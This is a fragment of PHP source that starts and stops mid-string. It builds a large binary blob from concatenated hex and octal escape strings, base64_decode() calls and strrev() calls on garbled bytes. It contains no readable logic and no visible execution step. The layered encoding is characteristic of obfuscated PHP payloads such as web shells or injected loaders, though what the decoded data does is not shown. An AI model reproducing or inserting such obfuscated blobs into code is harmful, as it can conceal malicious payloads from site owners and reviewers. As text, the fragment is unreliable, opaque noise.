ef\x1\x7b\x2e\x99\x7b\x62\x9d\xf9\xb7\xb3\xce\x69\x68\x38\x3f\x7f\xf3\xa9\xf9\xdd\xaf\x64\xe6\x14\x1e\xbd\xb8".base64_decode('f9/9em+1tvwmYzZ9456PZo38pHFGz9OfHH/PqYrytH/0oZ5JP/71/CX28BMXnbbroQ==')."\17\116\73\347\320\330\265\127\317\55\234\162\151\347\335\73\107\235\275\77\117\317\376\315\353\307\177\165\373\76\332\175\67\274\270\160\367\325\207\256\376\315\236\163\315\313\376\161\311"."\325\357\225\327\257\330\376\364\243\137\150\274\162\277\3\367\175\243\353\274\375\214\321\165\163\246\374\350\0\343\223\247\336\77\71\364\360\262\25\345\315\337\134\272\370\303\311\277\173".base64_decode('7KmOnbMa7jvr5rEHTj7rK/c8kn8ocWbqW2sfOPWPqSc2D6TX/PmX+7c2dl771tdmfg==')."\xfd\xe5\xc3\x27\xf5\x2c\xd1\x17\x4e\x39\xcb\x77\xfb\xff\xfc\x70\xea\x3\xe7\x5d\xf0\xd2\x6f\x8e\x9b\x7c\xf1\x25\x3b\xa6\xad\x3e\xf4\xbb\xe3\x47\xfe\xec\xee\x25\xad\xfb\x3f\xbe\xe6\xb9\xae\x87\xff"."\136\76\362\264\71\257\34\235\232\162\337\245\107\153\333\225\203\177\366\207\323\116\130\266\166\363\323\367\375\40\177\346\15\367\55\173\356\310\303\266\15\274\135\230\372\304\105\273\137"."\273\67\321\71\236\35\171\242\245\353\217\215\127\76\126\377\351\341\357\236\61\347\210\306\376\113\136\34\157\112\132\17\314\354\375\332\301\33\376\231\371\266\276\41\126\370\342\336\374".base64_decode('RZvmtf3i3KsTX0i/dNCDNTOve3v23n9at73Q/OxR/ifn31DY/fLy60e2LTj21a8V6w==')."\x57\xd5\x2c\xde\x3f\xbe\xe3\x67\x2b\x3\xa7\x6c\xbb\x20\xb3\xf7\xac\xf7\xaf\xff\xea\x81\x2f\xdc\x7d\xfd\x21\xc6\x95\x87\xb7\xde\xb8\x61\x6e\xa1\xf8\xd8\x21\x81\x2b\xd7\x1d\xa7\x8f\x9e\xf1\x8f\xd3"."\207\46\177\137\235\264\170\322\101\372\17\342\57\136\176\367\316\205\227\57\271\145\376\327\206\157\333\157\157\366\206\147\216\170\332\227\72\365\246\143\56\73\142\305\155\217\74\175\235".strrev('<ö³àçyÿu±ÜÅòß÷Ö/·¦úíNßUÅãü‚ö£>®wÕy·}5?µõ~›o5')."\xb7\x59\xff\xd7\x3d\x3f\xbc\xee\x8e\x1f\x1f\xf6\xca\xb7\x7e\x53\xfa\x65\xd7\xf6\x27\x97\x3e\x72\xe8\x29\x93\x7f\x78\xed\xf2\x93\x9f\x78\xfb\xc4\xd6\x86\xb1\xa5\x6f\x7e\x2d\xff\xcd\x9f\x5e\x3e\x65"."\xfa\xef\xcf\x3c\x61\x51\xfc\xca\x54\xfd\x51\x77\x5c\xbc\xff\xb7\x6a\xb6\xbe\x62\xf4\x7e\xf0\xbd\x93\x56\x24\xa\x87\x9f\x72\xf8\xf1\x87\xac\xea\xdb\xb6\xba\xef\x9d\xe7\xfe\x7e\x7b\xf1\xc6\xe9\x33"."\x8f\xd8\xf7\xcf\x17\x5d\x7b\xcb\xad\xbf\xf8\x60\x65\x74\xf7\x45\x37\xbe\xff\xca\xea\x1b\x2f\x7d\xf8\xdc\x7d\x2e\x3f\xc0\x38\xed\xc0\x93\x87\x1f\xac\x7b\xd2\x6f\x7e\x61\xcf\x83\x2f\x7f\xf2\xcb\x53"."\x4a\x4a\x74\xe5\xdc\xfb\xee\x4f\x9f\x7a\xdd\x58\xd3\xb7\xc2\xe7\x6c\xda\xf7\x90\x3f\x99\x81\xe5\x1b\x6\xb6\x3e\xfa\xc4\x6b\x4f\xec\xea\xff\xf0\xb2\xf2\x2b\x3f\x9c\xf9\x9b\x83\x9e\xf8\xe8\xb8\x63"."\347\74\172\366\302\225\261\335\117\75\162\335\103\73\136\70\343\375\57\357\171\145\143\367\242\73\207\56\371\150\307\103\217\175\362\227\207\266\335\265\141\135\352\344\237\76\366\144\217"."\377\264\113\6\76\331\371\302\377\134\361\335\261\17\376\376\316\212\233\257\130\375\351\7\157\314\371\203\332\277\355\73\377\171\373\117\173\202\177\120\77\335\363\311\367\246\114\271\342"."\323\267\336\337\161\375\357\27\175\372\367\37\155\275\363\216\107\77\171\365\137\337\175\261\366\234\105\113\77\356\72\337\234\251\247\16\130\122\363\333\333\2\77\375\352\3\127\237\64"."\351\114\347\303\243\264\257\324\357\271\50\377\372\103\217\115\135\323\366\324\215\305\67\217\133\163\356\103\67\314\230\362\355\370\346\377\214\274\265\347\206\173\216\114\245\256\170\60\371".strrev('ÑŞo›¢ç}]Íö—+Ü˜ù±Š~ÿ®»ö[¯¥ÿ{¥®é¤º7[3­ğî¼d³õ~×òÿ]')."\x7e\xea\x13\x53\x2e\x3e\x7f\xd7\xe1\x3b\x47\x7e\xbd\xe7\xa4\xf2\x13\x4d\xb1\xa7\x37\x75\xfc\xeb\xdb\xea\x31\x8f\xed\xf3\xfa\x2d\xbf\x5b\x7d\xf3\x77\xd6\x8d\x26\xce\xfd\xbe\x7a\x56\x7e\xca\xa6\x7"."\357\135\365\356\161\352\33\65\143\331\323\16\273\364\334\33\26\337\340\177\162\357\245\352\27\227\135\164\332\125\223\116\273\154\322\113\337\374\141\115\340\250\333\217\131\265\374\321\127"."\xc6\xdf\xb9\x64\xed\x29\xbb\xb4\xd6\x67\x86\x1f\x3c\x62\xd2\x27\x47\xec\xdf\xbc\xf1\xe2\xd5\xcf\xce\x5b\xf6\xcb\xaf\xef\x57\xfb\xd2\xe8\x4b\xe6\xdc\xf7\xd6\x2d\x9d\xb7\xf7\x5f\x2d\xc7\xbc\xf2\x95"."\207\266\334\165\101\140\357\141\113\346\245\227\227\37\331\277\66\163\367\205\317\374\50\364\335\324\5\147\354\170\161\331\266\373\267\135\174\312\63\267\265\371\167\47\233\237\371\244\143"."\xe8\xdf\x37\x24\x4b\x1f\xbf\xf6\xa7\xd5\xb7\xf5\xbe\xf1\xac\xfd\xd3\xf3\xf6\xda\xff\x7c\x77\x7b\xfc\x91\x6f\xc6\x7e\xfe\xda\xdb\xd9\x1b\x7f\xb1\xe1\xf6\xf5\x87\x3d\xf8\xf8\x9d\x97\xd8\x77\xdc\xb1"."\x7c\xf6\x3d\x87\xbf\x35\xfc\xe1\xc8\xf2\x77\x2\x8f\xff\xe1\xc6\xde\x3d\x57\xbd\x99\x98\xb6\xf5\xb1\x43\xf6\xf6\xec\xf5\xbd\x79\xda\x9d\x7b\x6f\xdd\x35\xbd\x76\xe5\x86\xf6\x55\x57\x5c\x32\xb9\x6f"."\363\25\177\321\42\233\6\16\235\64\375\37\177\233\74\367\313\367\205\362\347\77\166\344\133\107\156\177\350\223\371\127\65\235\375\332\103\265\341\17\207\233\327\364\16\274\30\174\366"."\310\17\17\275\140\311\252\65\345\207\216\76\52\63\345\340\257\157\72\174\317\313\253\142\255\357\326\37\374\223\77\37\364\3\377\207\107\377\174\332\120\363\247\153\266\274\165\371\76"."\xf5\xaf\x7e\x58\xdf\x7c\xf6\x53\xbf\xb9\xd3\x3a\xf6\x1b\xa3\x3b\x5e\xff\xc6\x94\x17\x13\x2f\xf9\xf7\x6f\x7a\xb1\xeb\xb9\xe5\x27\xd4\xe5\x7\xdf\xfc\x89\x36\xe9\xe9\x33\x57\x2f\xdc\xbe\x25\x9c\xdf".base64_decode('+8nFev1AaaZ5128vPuW9m0rtRwRPunFqYvrQTUeuPm3HIw/0/uH9Hx+0Zu5Fha9tXQ==')."\177\346\344\263\273\233\216\312\326\176\243\246\63\161\312\76\375\47\147\357\173\53\367\302\75\177\354\272\152\356\332\353\277\372\247\117\302\377\71\357\371\271\357\135\266\157\377\355\113".strrev('MÕo;6O…ÑèÅKé{\\æ[®‹ŸúZjÍ×‹ÂššÌğ-AY¦ÁùÏ³Ìò»í×kîyYn')."\x7a\xf1\xc3\x57\xd7\xa4\xdf\xad\xdb\x75\xe3\xc9\xf7\xe\x34\x3f\xff\x4a\xe0\x8e\x47\x7\x7f\x79\xfa\x7\x27\x5d\xbf\x70\xef\x3f\xb7\x3f\x9e\xa\xf\xfd\xa5\xfe\xd2\x83\x5e\xee\x1a\x5a\x7f\xc2\xab".strrev('=|S­şıßX¼Üz›¾çèauûO_ß_½İ—Ãó¼å5ß/?¹ö¼_çÔsjG').strrev('öºX«¶Áş¬ö4:6´o–Õ~\\Î·¾ªàvüïø¹õ?¿Eòÿšèuß¦ƒãı')."\214\5\103\275\327\326\350\177\176\70\173\321\367\62\303\347\174\374\327\344\264\55\345\355\357\177\264\50\170\371\306\261\367\376\375\207\233\356\373\360\203\217\316\120\57\373\357\73\43"."\273\216\331\70\376\321\37\157\73\147\321\177\376\375\343\51\127\154\135\364\357\232\33\176\277\42\166\205\372\351\256\75\357\376\353\3\65\240\156\273\367\223\327\277\367\217\277\176\272"."\375\223\327\16\12\336\377\361\243\177\332\165\305\247\377\275\377\212\367\226\370\17\370\347\206\33\332\336\150\135\363\344\112\163\347\63\267\114\172\145\325\375\377\230\255\156\370\167\313".strrev('™Ãä¹^ô}7áj|äú|}/Ç[æ:Ş{î­é:ÿ#™şmeş¿òûr^lö')."\163\57\213\346\162\167\375\154\307\270\366\263\225\47\15\374\376\206\377\256\134\71\355\355\45\307\57\133\170\256\362\317\57\135\276\343\344\206\243\337\70\374\53\207\277\274\354\275\251"."\x33\xdf\x78\xa9\x69\xf6\xf0\x81\x4d\x5b\xe6\x7d\xf5\xee\x75\x4f\xcc\xd2\xe6\xfe\xf7\xf0\xd4\xcd\x8f\x2e\x3e\xf7\x50\x66\x4f\xd3\x34\x17\x84\xb1\x23\x65\xcd\xce\xe\x82\xa0\x71\xb4\x3c\x96\xb3\xd6".strrev('U£5³6æ=šÃfÖf+Ü»èüœ§ˆY‹„Î6ş€Xs™İÍ42œ')."\6\165\314\152\204\54\115\263\130\12\375\31\312\351\153\15\46\236\200\74\363\232\32\31\63\234\36\132\237\7\1\313\272\202\66\62\232\205\117\316\234\7\25\317\156\232\107\3\303"."\251\342\130\116\203\236\346\122\353\207\362\172\226\165\21\76\71\157\16\64\157\264\140\153\143\105\70\232\314\235\1\132\210\226\75\74\230\141\247\53\253\64\72\74\142\103\157\347\314"."\205\202\166\71\63\64\154\260\103\116\166\170\160\44\303\144\234\131\43\147\215\300\45\372\332\174\101\113\225\241\55\263\130\375\116\176\44\65\274\26\170\363\131\263\331\260\216\71\326"."\120\11\332\62\143\36\344\65\312\353\206\327\62\375\122\53\357\254\55\260\173\344\246\71\60\141\143\351\41\113\33\206\317\317\152\200\361\130\133\64\7\63\303\320\302\131\63\131\273"."\7\65\63\75\14\47\363\246\31\60\316\351\165\345\321\101\3\370\360\271\154\22\315\365\345\21\256\313\322\324\0\363\64\273\21\2\345\264\221\317\16\303\325\245\71\230\32\33\31".base64_decode('hmYOavliZrjEGgT9G82szeUN6PVsBjXtdaNjzOJqzjyYoKGxYm7ELrDGM0ScAcmllA==')."\246\27\31\256\150\153\307\112\246\3\35\155\234\7\215\37\324\327\216\24\312\60\155\263\147\3\222\33\43\346\372\301\61\150\331\230\146\33\43\114\272\65\243\21\320\47\225\321\12"."\x56\x19\xe6\xaf\x89\x75\x76\x16\x8c\x9f\x39\xb2\xde\xc8\xf\xe5\x18\xc2\x0\x34\xeb\x8c\x8e\x95\x86\x32\xac\x95\x30\x2f\x39\xcd\x5c\x3b\xea\xac\x83\xa9\x4b\x65\xcc\xe1\x32\xf4\xbe\xb1\x11\xb2\xcc"."\x9d\xc3\x30\x6e\xfd\x70\x36\x3\xa9\x33\xd9\xc7\x52\xeb\xac\xb4\x96\x87\x8f\x35\xce\x85\x89\xb5\xf3\x4e\x7a\x2c\x35\xc8\xc6\x86\x2d\x1f\x27\xb5\x6e\x34\x7\xb7\xff\xa9\xc1\x8c\x51\xb2\x61\x7d\xaf"."\63\163\345\222\3\221\231\115\254\226\262\266\66\313\232\154\71\131\263\74\6\203\325\330\300\126\50\124\335\304\26\363\314\331\263\131\27\1\73\33\131\236\231\263\241\47\115\14\235"."\x67\xcc\x82\x31\x1f\xd5\x8b\xd9\x75\x69\xc0\x93\x19\x73\xa0\xe4\xcc\x19\x30\xde\x33\x66\xcf\x64\x93\x9a\x47\x88\xcc\xf4\x11\x73\x5a\x69\xad\xc9\xe\x6e\x73\x67\x30\xfc\x80\xd2\x4d\x33\xe0\x2b\x69"."\153\175\336\311\101\345\271\214\225\65\113\153\131\103\240\325\363\330\252\317\215\151\243\234\352\315\156\230\315\146\166\6\103\35\250\174\270\120\64\62\45\100\250\246\71\54\171\56\44"."\317\231\1\103\70\226\52\145\322\114\277\152\254\64\232\325\6\141\10\163\251\142\132\147\65\330\316\350\272\334\132\66\376\163\240\360\274\106\10\160\5\324\126\55\75\304\344\277\262"."\x16\x27\x37\xbe\x2a\x6\xa\x5a\x91\x2b\xcf\x74\xc2\x5c\xa7\x65\x85\x7d\x39\xc3\x90\xae\x33\x55\x6f\xa6\x4c\x2e\xb4\x33\x40\x6b\x14\xe0\x46\x41\x17\xf2\x6b\x7a\x63\xc0\x4a\x8a\xf3\x39\x16\x86\x48"."\xfa\x1d\x38\x9a\x90\x6b\x49\x17\x1d\x29\x19\xc5\x5c\xa9\x9\xc7\xb4\xb8\x46\x9\xd5\x55\xb\xe0\x16\x6\xe4\xae\xae\x2a\x30\xb2\x50\xe5\xb2\x11\x24\xb3\xb6\x3d\x62\x5a\x30\x64\x43\x66\x26\x9d\x37"."\313\31\127\255\231\224\253\116\16\145\2\5\157\112\166\2\70\252\307\245\167\315\140\256\301\112\221\111\123\345\110\200\15\167\112\232\120\52\124\167\64\173\50\40\203\375\162\252\121"."\x44\xad\xc8\xe7\x3\x6e\xdb\x51\x95\xfc\x81\x31\xa0\xf6\x89\x36\xd6\x52\x2e\x8a\x8b\x6a\x7b\x48\x1a\x78\x6c\xf4\xd9\xdb\xa3\x26\x43\x89\xa5\x92\x42\x1f\x36\x4a\x64\xe8\xa4\xa\xc5\x7a\xa9\x5b\xa2".base64_decode('Bmkc5Rl0DwHDkN0337Pj/It3XnTLzs037bh7y+6bbtmx7SIUff3O83bcdPkbl256/Q==')."\xce\xcd\xaf\xdf\x79\xf2\xee\x33\x7e\xf5\xce\xbd\xe7\xee\x38\xff\xe6\xdd\xdf\xdb\xb6\x63\xeb\x35\x3b\x7e\x7a\xc6\xeb\xf7\x6c\xdb\x7d\xff\x19\xbb\xae\x39\xe7\xf5\x3b\x6f\xdc\xb9\xf5\xac\x1d\x9b\x7e"."\375\372\75\27\357\70\363\312\35\147\234\277\163\313\346\327\267\155\105\371\167\236\51\152\106\331\166\334\170\11\56\173\357\251\73\356\274\163\367\117\256\341\251\357\334\173\12\155\314".strrev('"Ÿ¢Íş†—jˆqKuréVôõ¤¬#G^OJ·RBÊ:2--2rÛu‹Š z').base64_decode('tZO1FaOIkxU2NwGOlEm9UMKoBaMUpLZ0LmV+Cf+qDTNNqIJWeKzFXNXhIFzDYfmekg==')."\325\20\40\323\254\144\121\61\205\231\304\50\216\311\302\205\61\76\351\236\105\120\165\132\171\63\330\324\346\270\230\135\110\177\241\141\222\151\6\275\152\251\100\51\262\252\334\44\301".base64_decode('td7cxEROco8EiGeJloBPoU3xKeRuWHEbjuJbf3aTLq8xufmWXspLt0SlsaqDKLdGvg==')."\x98\xf6\x74\x2d\x51\x65\x18\x79\xe7\x5c\x89\x68\x5d\x97\x9d\x2a\x19\xe5\xd1\x96\xc5\xc1\x86\xd9\x96\x47\x84\x4e\xdc\x66\x92\x7b\x7b\xd1\xd\x1a\x15\x62\x68\xf4\x21\x4e\x27\x2d\x3d\x63\x30\x55\x64"."\275\100\162\62\73\16\42\374\346\72\320\151\264\4\54\327\35\326\202\105\245\301\22\66\273\167\346\57\2\363\136\270\23\124\245\357\102\130\130\22\311\320\274\367\136\214\57\230\366"."\x56\xc9\xf8\x1d\x67\x6b\xf6\xfb\xfd\x92\x7c\x57\x28\x9f\xe1\x10\x54\x27\xee\x8b\x11\x2c\x8c\x57\xf3\x44\xf0\x76\xae\x45\x81\x96\x79\x2e\xa7\xdb\x4e\x33\x31\xca\x53\xa6\x2b\xa8\xa1\x73\x3\x8d\x28".base64_decode('QBbErMAcFCSjBIu4H0aubDNLmamBmXBksOeDCsh8QktapOYDXJQqF/MMioIoS7xcxA==').base64_decode('M9zs7rNezEiF5mtpR6pVzcKgBsR4aNNFup45FiZGGqURyMDKdrnnHfXfz1EBTS9iFw==')."\62\66\121\135\205\35\7\252\264\45\173\345\270\300\42\134\234\14\327\147\24\165\344\51\57\41\226\244\310\165\126\355\274\306\356\33\155\154\2\122\324\71\376\225\155\176\45\322\32"."\x4a\x44\xda\xd4\x9e\x10\xb3\xc6\xd0\x4a\xa5\xa0\x9d\x19\xb2\x83\x58\x57\xd2\x18\xd6\xa3\x46\x2a\x88\xd\x99\x31\x3a\x5\xb8\xa9\x2f\x5e\x44\x82\x8\xa8\x5a\x16\x8c\x3c\x23\x90\x8e\xb5\xc6\x55\xc4"."\41\330\22\231\120\163\272\243\2\323\304\70\27\274\13\250\132\312\264\34\151\255\250\31\166\276\213\106\132\325\366\110\134\252\243\124\256\250\103\162\120\21\352\211\250\211\104\114\352"."\16\61\317\134\251\56\215\265\253\155\261\330\322\10\54\3\230\370\146\211\122\143\163\76\161\323\215\143\302\254\17\137\16\311\172\156\62\53\204\75\10\340\355\76\241\200\266\50\132"."\x6f\x6d\x9d\xa1\x38\xd7\xd1\x9f\x15\x68\x8\x34\x8a\xbc\xe8\x83\x2a\x36\x55\x68\x61\xd6\xca\x89\x64\x28\x5e\xc5\x8f\x4\xf5\x2f\x1\x48\x1\x3e\x25\xa0\x40\x67\x6c\x85\xd2\x16\x8b\xf6\x76\x75\x27"."\250\373\4\12\357\216\111\351\104\23\33\222\231\227\211\312\144\250\76\334\23\15\265\205\225\110\167\62\306\114\55\270\62\54\61\262\111\360\70\33\2\313\326\271\27\11\50\117\43"."\xb2\x21\x90\x5c\x23\xaf\x9\x96\x51\x9f\xaf\xb6\xbf\xa6\x7f\x5a\x7f\x5d\x7f\xfd\x9a\x40\xbf\x3d\x0\x4\x8f\xcc\x88\x21\x4f\xf\x44\x7a\xda\xa1\x7b\xcd\x3c\x94\x61\xd2\x81\xae\x44\x62\x19\x98\x8".strrev('÷]Üéº=˜J±şÎêt;EQ›YÇi¾?]¼û¿_[Âë°4"ÚÆnB'."\n".'k(¶¡âÆ')."\xb7\xf3\xc2\x9b\x77\x9e\x7b\xa\xb4\x7f\xf7\xcd\x77\xbc\xbe\xed\xfe\x5d\x17\x5e\xb3\xe3\xa6\x4b\x76\x5e\x7c\xd7\xae\x1f\x9d\x46\x13\xde\xb8\xf6\xd6\x1d\x67\x5f\xc3\x1b\xa6\xbc\xb1\xe5\xbe\x9d\xe7"."\375\214\263\114\224\123\362\241\322\157\154\332\274\153\333\115\230\141\272\372\344\235\267\237\263\163\353\346\35\147\377\144\307\245\327\354\72\357\346\35\127\175\157\307\351\233\167\337\174"."\321\261\136\104\242\361\76\66\25\140\145\33\134\215\215\212\351\360\366\333\323\361\320\326\243\337\72\154\271\201\176\231\2\72\121\112\136\326\33\356\156\13\173\55\241\344\50\270\340"."\x98\x46\x31\x84\x6a\xdd\x0\x77\x6b\x83\xb\xf\x16\x27\x96\xfc\x2d\xb5\x13\xb6\x62\x1c\xe6\x5f\x6a\x94\xd4\x98\xf6\x70\xa2\x2d\x1e\x69\xd\x83\x6d\x0\x9f\xa8\xa9\x84\xbf\x3\x95\xb\x4\x4d\xc4".strrev('³ö^–='."\0".'Gx5)e˜‹DÃãRd¬•cI._3iÑ\\W®d1Ô¢™p¬ò·0ó—')."\x40\xb4\x89\x6b\x57\xd5\xfa\x1a\x7c\x8d\xf5\xa\xf8\x53\xa1\x25\xc0\x8b\x8a\x52\x3\x2a\xea\xbc\x9c\xeb\x23\xbe\x94\x2b\xd6\xe8\x6b\xa8\x57\x6a\x4a\x43\x35\xd0\x2e\x31\xae\xa8\xf5\x2a\xcd\x69\x2b"."\232\257\16\32\54\67\127\344\105\324\314\166\54\315\100\344\115\111\373\70\210\227\107\277\56\317\50\351\200\50\101\347\11\345\360\302\224\120\167\273\73\47\165\250\322\123\113\324\65"."\xd3\x1\x87\x3b\x6c\x60\xd3\x5c\x5b\xaf\xa4\xc0\xe2\xa2\x4a\x22\x29\xe6\x1a\x8c\x16\xd7\x60\xd4\x4d\x7\x3a\xd1\xb3\x98\xcf\x37\x35\xa7\x50\xa8\xb5\x1d\x6d\x96\x66\xb3\x89\x2\x28\x99\x2a\xc\xa5"."\263\305\362\232\250\33\150\162\150\176\24\340\51\330\360\200\327\204\310\21\117\140\63\210\341\174\22\253\244\21\117\67\65\224\7\245\375\54\330\71\106\352\300\303\112\327\52\336\7"."\206\313\60\5\272\360\223\203\355\6\303\311\266\116\212\345\11\11\315\63\251\251\56\104\25\303\251\270\120\204\37\144\40\37\135\56\230\40\114\46\371\42\335\35\261\170\27\265\227"."\x4b\xb4\x75\x86\xbb\x42\x1\x20\xe2\x14\x13\x68\x7e\xcc\xe9\x29\x2d\x4a\x2d\xa6\x7c\x14\x54\xeb\x1a\x7e\xf2\x21\x36\x64\x49\xf2\x55\xb4\xae\x54\x7\xb1\x6d\x74\x14\x4a\x39\x68\xc\xcc\xbe\x42\x4c".strrev('¹“3ø‹2?\\oqœaæP;0×Ù±Í4·iZİQ,ò'."\0".'¢©<X§C¹*€¦ú–¥¤R5Ş').strrev('‘¥"ø¡DÔ2J«'."\n".'] NÁ=©ÁDÄ¿¹Ã¶™„GwX¶­üQô(?˜¤Èê').base64_decode('+36cwHkBFBGsAIrwTQjnkhxX4e8nunlYsOAo0ptgpiKYKq9o5+FObtiNE2JxKRKKhw==')."\xba\x12\x3c\x1a\x5f\xc1\x4d\x4f\x38\x8c\x9a\xa0\xa8\xdd\xbd\x5d\x62\x27\x88\x86\x96\x23\x24\x8a\xb1\x79\x60\xe7\xa2\xe0\xea\xba\xc0\xb4\x45\xf5\xfd\xd4\xaa\x8f\x6\xe9\xcf\x89\x2c\x86\x2d\x9d\x6"."\x36\x34\xfa\x94\xd9\x1b\xeb\x21\xf\xb3\x83\x53\x9d\x41\x34\x4d\xaa\xf8\xca\xb2\xa8\x1a\x8d\x2d\xa6\x71\xe2\x50\x2b\x5c\xcc\x88\x53\x92\xd2\xa7\x20\x86\x3c\x29\x18\x72\x9b\x6d\x69\x7c\x95\x28\x8"."\xb7\x15\x6a\x2a\xac\x74\xc7\x56\x84\x84\x8f\x26\x29\x1\x20\xc2\x65\x53\x70\x75\x5f\xff\x48\x7f\x0\x31\x11\xf6\x1a\x61\xa5\xd7\xde\xaa\x30\xf6\xa4\x8d\x48\x19\xa8\x30\x2\x4a\x87\xd8\xf6\xba\xc6"."\x7\x3b\x89\x9a\x37\x73\xcc\xdf\xa\x22\x94\xe3\xc0\x46\xd0\xdf\x95\x2c\x40\x68\x28\x14\x40\x47\xef\x52\x9e\x99\xeb\x51\x3b\x41\xb5\x7f\xbc\xff\x84\x7e\x7f\x80\x9a\x46\x62\xa6\xa6\xdf\x27\x9a\xa4".base64_decode('hleivTeRcNl1qsQNEdSOegkhupppZAH8wJlwAbCtEF3YwiczvGy8G/1dnBwPo79R9A==')."\x13\x4d\xa2\xe9\x32\x78\x6\xb4\x54\xa3\x91\xa5\xe1\x71\xfc\x8f\x48\xa8\xe7\x3\x49\x2d\xa0\xdc\x5\x22\xdd\xe3\xe8\x5f\x44\x78\xc6\x23\xdd\xde\xca\x5a\xc3\xc9\x15\xe1\x30\xcd\xc0\xc2\xf0\x2b\xb2"."\x22\x42\x4\x5d\x95\x1c\xae\x61\x13\x3\x48\x16\x26\x7\x50\xb5\xaa\xd6\x91\xc1\xf4\xf\x4c\xaf\x57\xd5\xa0\xdd\xb\xf8\xc2\x1d\x5f\xd4\xd5\x1e\xdf\x58\xb\x7b\x4b\x28\xd1\x36\xce\xa9\xb2\xb\x21".strrev('—e0ÓLİáFCQ'."\r".'Hö•ªƒMpX³ºG–†wŠG·¬xâøƒ»¸q*').base64_decode('ZG7YhdLtiOKjiMTK40MCpdjuVdbaG4m2y6bsOCMNTSXUHvaaqaxxLE6M2lkEDzkLEw==')."\164\143\21\62\6\54\102\7\200\305\310\160\261\10\361\242\306\42\244\243\54\202\117\55\341\156\226\206\316\256\350\334\311\16\244\203\332\60\267\305\234\237\111\111\16\62\60\15\16"."\120\371\35\366\215\202\116\167\32\227\262\172\104\264\104\132\46\11\44\250\222\240\42\231\204\7\51\10\161\241\4\210\176\373\327\54\42\134\362\32\206\230\324\356\330\111\32\116\336".strrev('OÃZ]8­ui"$V¡<tÂ£'."\r".'!'."\0".'Ë²qòJj¤ÙSÏ°;éP£‰_DO°õ').base64_decode('TOC0wwe/0KID6U8/RJkwBQxtan2w+TLjDPepub+/ZqLRggxszCBaQ6OsFAwk2vPSgw==').strrev('LK­]ZX¹ êñ‡‹jåkÛ'."\n".'–¥w¨Pé‰œ¡ë=¼EÎŠ›Ø„Ú0˜êŠÑØ')."\xb6\xb0\x56\x1\x53\xef\x7a\x77\xa9\x48\x77\x7b\x78\xa5\x52\x6b\x64\x46\x55\x4d\x53\xa1\xb0\x82\xd6\x22\xab\x48\xa9\xa8\x89\xd5\x40\xdb\xa\xf7\x4e\xf6\xa0\x39\xa2\xc8\xe8\xc5\xce\xd1\x6d\x14\x96".strrev('EhÄT+ñP”> `)İÂŸ\\†IE=%;'."\r".' Iše9Bu‡Ö¬Ì'."\r".'?²ÁW(')."\64\51\274\62\31\17\141\40\341\112\17\230\214\376\20\202\202\117\115\126\101\243\266\246\204\227\13\254\1\341\301\32\27\353\110\231\112\314\74\2\6\221\55\117\352\23\117\41\22".strrev('w9ÑaFqã<'."\r".'²Õ¨İï6J÷aˆ‹Yw™ V'."\0".'ÙÄÈ`«â…tÖ4ãp)a|²Ì:').base64_decode('HCgsag0sADzzNAhOL1Vu0syEK3XMNNjHAsy1BDGhYhK0AiI5PCZmDXAfZkVOlY3AhA==')."\x57\x4e\xbc\x49\xe2\x49\x86\x5\x10\xee\x8\xf5\x46\x65\x8\xc\x95\xb2\x34\xbc\xea\x33\xd6\x8\x6b\x69\xb5\x35\xc2\xd2\x98\x98\x86\xaf\x36\xe8\x4f\xdd\x2c\xe8\x1f\xf5\x76\x51\xd7\x84\xce\xaa\xe5".base64_decode('Inbnwn0CQqtoLNSbjKlo/4iHMTWHHvFhldorncflSYFqcAbu4vQzusbyVOsaL88lUg==')."\341\356\305\221\356\160\113\327\130\44\21\352\122\130\303\101\346\206\75\1\316\205\172\42\61\65\212\170\142\125\26\253\105\142\40\174\16\244\144\127\47\252\360\230\22\320\204\302\270"."\143\225\45\317\224\206\111\224\263\273\270\35\7\321\46\107\10\21\22\236\22\270\200\234\244\225\123\270\264\274\135\101\171\217\67\107\303\154\306\51\70\63\345\122\346\213\354\252\353".base64_decode('417tbBksFMXFnTK7w0b7kKtAr+TpABdW2AfJrVLR3Ty0X+aZiyZVF70p6LbN75bJ4Q==')."\x87\x5\x9d\x41\xe1\xe8\x41\x76\xa6\xd9\xde\xca\x46\xae\x5c\x74\x12\x7a\x1e\xa4\xfd\xed\x29\xa2\x66\x2f\xac\xe3\x84\x5\x92\xa4\x7e\x4f\x2e\x6a\xc4\x74\x50\xb7\xa6\x9e\x82\x50\x53\x84\xf7\x57\xca"."\x25\x80\x51\xe1\x3d\x13\xdf\x91\x88\x3a\x7\xd8\xd1\x5e\x74\x72\xbd\xc1\x76\x36\xef\xd\x23\x6f\x64\xd1\xec\xd1\xad\x82\x41\x2e\x83\x56\x8\x83\x1f\x9e\xae\xcb\x8\x50\x6d\x80\xfd\x8d\xd2\x17\x24".base64_decode('E0cchYnEt52SrUi5iNrll62P0MQSoGTvwHx/0tgc0OrgNldODiDs12IpAeHIhtSJeQ==')."\x17\xbf\x70\x2c\x91\xd1\x64\x43\x4f\xc9\x67\xf4\xb1\xf2\x8c\x93\xa9\x13\x88\x97\x35\x64\x2f\x13\x1\xe1\x48\x94\xe3\xf2\x89\x7c\xc0\xb1\x1\x34\x5c\xd1\x63\x3e\x38\xab\x4a\x6d\xe9\xe1\xf9\xd3\xdc"."\143\64\35\15\151\230\11\200\6\311\352\123\232\105\43\72\121\113\115\153\114\302\1\11\332\305\174\57\201\33\323\250\11\34\53\66\330\320\35\360\272\345\42\36\221\30\224\15\350"."\330\372\211\332\242\140\133\65\136\220\272\121\373\374\102\275\222\47\327\11\326\173\325\162\155\220\221\177\320\42\62\236\317\377\140\134\27\133\62\52\106\214\315\76\267\220\240\177\344"."\x4b\xa4\x90\x44\x33\x3d\x65\x8\x3a\x52\xc3\x18\x98\xf9\x41\x48\x16\x38\x86\x8\x75\x77\x4c\xed\x44\x7b\x41\x8c\x71\xc\x86\x9d\x74\xd1\x5e\x56\xa\x48\x81\x83\x18\x9a\x74\x90\xd8\xf1\xc2\x79\x6c"."\76\271\114\242\27\233\60\331\33\20\131\345\41\246\312\1\256\274\304\116\35\242\77\253\12\31\77\152\70\140\135\106\167\270\13\45\114\315\230\315\43\156\263\144\370\134\340\324\157"."\x44\x72\x4e\xa9\xd\xeb\xd8\xb6\x8c\x49\x3b\x2a\x34\x6a\xa0\x2b\x95\x9d\x83\x26\xe2\xdb\xaa\x44\xac\x37\xce\xae\x54\x70\x1c\x8b\x8c\xd4\x78\xb8\x6d\x15\xbf\xdd\xe0\xd0\x8e\xd0\x72\x2f\x24\x82\x45"."\201\241\305\125\301\134\20\205\341\344\304\247\306\143\130\222\27\216\166\170\12\44\72\271\57\121\67\114\215\106\272\227\126\115\100\174\103\227\124\204\2\43\311\160\227\